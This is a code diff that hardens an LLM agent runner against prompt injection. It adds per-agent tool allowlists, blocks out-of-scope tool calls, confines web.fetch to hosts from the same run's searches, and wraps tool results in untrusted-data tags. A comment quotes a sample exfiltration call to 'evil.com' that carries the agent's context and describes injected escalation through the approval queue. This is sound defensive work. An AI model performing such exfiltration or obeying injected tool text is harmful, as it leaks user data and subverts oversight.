@@ -162,6 +162,39 @@ _NON_OLLAMA_BACKENDS = {
 }
 
 
+# === Per-agent tool scoping ===
+#
+# Contract (pinned): an agent that declares no `tools:` frontmatter at all
+# gets ONLY a read-only academic subset — academics.*, calendar.list_events,
+# inbox.list_open, system.audit — never web.*/vault.*/browser.*/code.task/
+# consensus.ask. An agent gets anything beyond that ONLY by declaring it
+# explicitly in its spec.
+_DEFAULT_SAFE_PREFIXES: tuple[str, ...] = ("academics.",)
+_DEFAULT_SAFE_EXACT: frozenset[str] = frozenset({
+    "calendar.list_events", "inbox.list_open", "system.audit",
+})
+
+
+def _is_default_safe_tool(name: str) -> bool:
+    return name.startswith(_DEFAULT_SAFE_PREFIXES) or name in _DEFAULT_SAFE_EXACT
+
+
+def _host_of(url: str) -> str:
+    """Lowercased hostname of a URL, or '' if unparseable (no port)."""
+    from urllib.parse import urlparse
+    try:
+        return (urlparse(url).hostname or "").lower()
+    except Exception:
+        return ""
+
+
+def _fetch_host_allowed(url: str, allowed_hosts: set[str]) -> bool:
+    """A web.fetch target is allowed only if its host surfaced in this run's
+    web.search results (egress confinement against prompt-injected exfil)."""
+    host = _host_of(url)
+    return bool(host) and host in allowed_hosts
+
+
 def _resolve_ollama_model(spec_model: Optional[str]) -> Optional[str]:
     """Map an agent spec's `model` field to an Ollama model name for chat().
 
@@ -218,7 +251,7 @@ class AgentRunner:
         # Track in-flight tasks for cancellation
         self._in_flight: dict[str, asyncio.Task] = {}
 
-    def _build_tools(self) -> list[ToolSpec]:
+    def _resolve_services(self) -> dict:
         # Resolve services via factories (lazy). If a factory is None or
         # raises, that tool is simply not included.
         services = {}
@@ -229,10 +262,44 @@ class AgentRunner:
                 services[name] = factory()
             except Exception:
                 services[name] = None
+        return services
+
+    def _resolve_allowed_tool_names(self, spec: AgentSpec, services: dict) -> set[str]:
+        """Compute the tool-name allowlist for one agent (per-agent scoping contract).
+
+        - Declares `tools:` explicitly -> exactly that set (whatever names it
+          lists; availability is still gated by service presence in build_tools).
+        - Declares nothing (None or an empty list) -> the default-safe,
+          read-only academic subset. NEVER web.*/vault.*/browser.*/code.task/
+          consensus.ask unless the spec asked for them by name.
+        """
+        declared = getattr(spec, "tools", None)
+        if declared:
+            return set(declared)
+        full = build_tools(
+            calendar_service=services.get("calendar"),
+            inbox_service=services.get("inbox"),
+            browser_service=services.get("browser"),
+        )
+        return {t.name for t in full if _is_default_safe_tool(t.name)}
+
+    def _build_tools(self, spec: Optional[AgentSpec] = None) -> list[ToolSpec]:
+        """Build the tool list, scoped to *spec*'s declared tools when given.
+
+        *spec* is optional (not just for back-compat call sites elsewhere in
+        the codebase like the Approvals-execution path in app.py, which has
+        no agent spec in scope): omitting it returns the full, unfiltered
+        registry, exactly as before this method took an argument. Only the
+        _execute() tool-loop path — which always has the running agent's
+        spec — gets per-agent scoping.
+        """
+        services = self._resolve_services()
+        allowed = self._resolve_allowed_tool_names(spec, services) if spec is not None else None
         return build_tools(
             calendar_service=services.get("calendar"),
             inbox_service=services.get("inbox"),
             browser_service=services.get("browser"),
+            allowed=allowed,
         )
 
     async def _chat_with_retry(self, messages, tools, agent_model, retries=2):
@@ -407,8 +474,16 @@ class AgentRunner:
         """
         from backend.ollama import ChatMessage, ToolCall
 
-        tools = self._build_tools()
+        tools = self._build_tools(spec)
         ollama_tools = tools_to_ollama_schema(tools)
+
+        # Egress confinement for agent web.fetch: an agent may only fetch hosts
+        # that surfaced in THIS run's own web.search results. Kills the
+        # prompt-injection exfil "web.fetch evil.com/?data=<context>" — an
+        # attacker host never appears in a legitimate search — while leaving the
+        # scholarship scout's search→read flow (its declared, scheduled job)
+        # fully intact. Persists across the run's iterations.
+        allowed_fetch_hosts: set[str] = set()
 
         # Compose the message history as ChatMessage objects (not raw dicts —
         # the refactored OllamaService.chat() takes list[ChatMessage]).
@@ -521,7 +596,32 @@ class AgentRunner:
             # Otherwise: append the assistant's message, then execute each
             # tool call, then add the tool results as 'tool' role messages
             messages.append(assistant_msg)
+            # Hard per-agent scoping boundary. `tools` is already filtered to
+            # this agent's declared (or default-safe) set. A call to a REAL
+            # (registered) tool outside that set — model hallucination or
+            # prompt injection — is refused outright: never executed, never
+            # escalated to Approvals (a queued item would otherwise let a human
+            # approve a registered tool the agent was never scoped for, e.g. a
+            # bare read-only agent smuggling vault.write into the queue).
+            # Unregistered outward tools (comms.send etc.) are NOT blocked here
+            # — they follow the escalation-for-approval design intentionally.
+            allowed_names = {t.name for t in tools}
+            registered_names = {t.name for t in self._build_tools()}
             for tc in tool_calls:
+                if tc.name in registered_names and tc.name not in allowed_names:
+                    run.tool_calls.append({
+                        "tool": tc.name, "args": tc.arguments,
+                        "gate": "blocked",
+                        "result_preview": "[blocked] tool not available to this agent",
+                    })
+                    messages.append(ChatMessage(
+                        role="tool",
+                        content=json.dumps({
+                            "error": f"tool not available to this agent: {tc.name}",
+                        }),
+                        tool_call_id=tc.id,
+                    ))
+                    continue
                 decision = autonomy.classify(tc.name, tc.arguments)
                 if decision.decision != "allow":
                     run.escalations.append({
@@ -547,11 +647,28 @@ class AgentRunner:
                 tool = get_tool_by_name(tools, tc.name)
                 if tool is None:
                     tool_result = {"error": f"unknown tool: {tc.name}"}
+                elif tc.name in ("web.fetch", "browser.fetch") and not _fetch_host_allowed(
+                    tc.arguments.get("url", ""), allowed_fetch_hosts
+                ):
+                    # Only fetch hosts this run already surfaced via web.search.
+                    tool_result = {
+                        "error": "fetch_not_allowed",
+                        "detail": ("web.fetch is limited to hosts returned by "
+                                   "web.search in this run — fetch a search "
+                                   "result, don't construct a new URL."),
+                    }
                 else:
                     try:
                         tool_result = await tool.handler(**tc.arguments)
                     except Exception as e:
                         tool_result = {"error": f"tool raised: {type(e).__name__}: {e}"}
+                    # Remember hosts a search surfaced so later fetches to them
+                    # pass the egress confinement above.
+                    if tc.name in ("web.search", "browser.search") and isinstance(tool_result, dict):
+                        for _res in (tool_result.get("results") or []):
+                            _h = _host_of(_res.get("url", "") if isinstance(_res, dict) else "")
+                            if _h:
+                                allowed_fetch_hosts.add(_h)
 
                 try:
                     events.publish({"type": "agent.run", "phase": "step", "agent": spec.name, "run_id": run.id, "tool": tc.name})
@@ -563,9 +680,17 @@ class AgentRunner:
                     "args": tc.arguments,
                     "result_preview": str(tool_result)[:200],
                 })
+                # Tool results can carry attacker-controlled text (web pages,
+                # fetched files, vault content) — never trusted instructions.
+                # Delimit it explicitly so the model treats it as data to
+                # reason about, not as commands to follow.
                 messages.append(ChatMessage(
                     role="tool",
-                    content=json.dumps(tool_result, default=str),
+                    content=(
+                        "<untrusted_external_data>\n"
+                        + json.dumps(tool_result, default=str)
+                        + "\n</untrusted_external_data>"
+                    ),
                     tool_call_id=tc.id,
                 ))
 
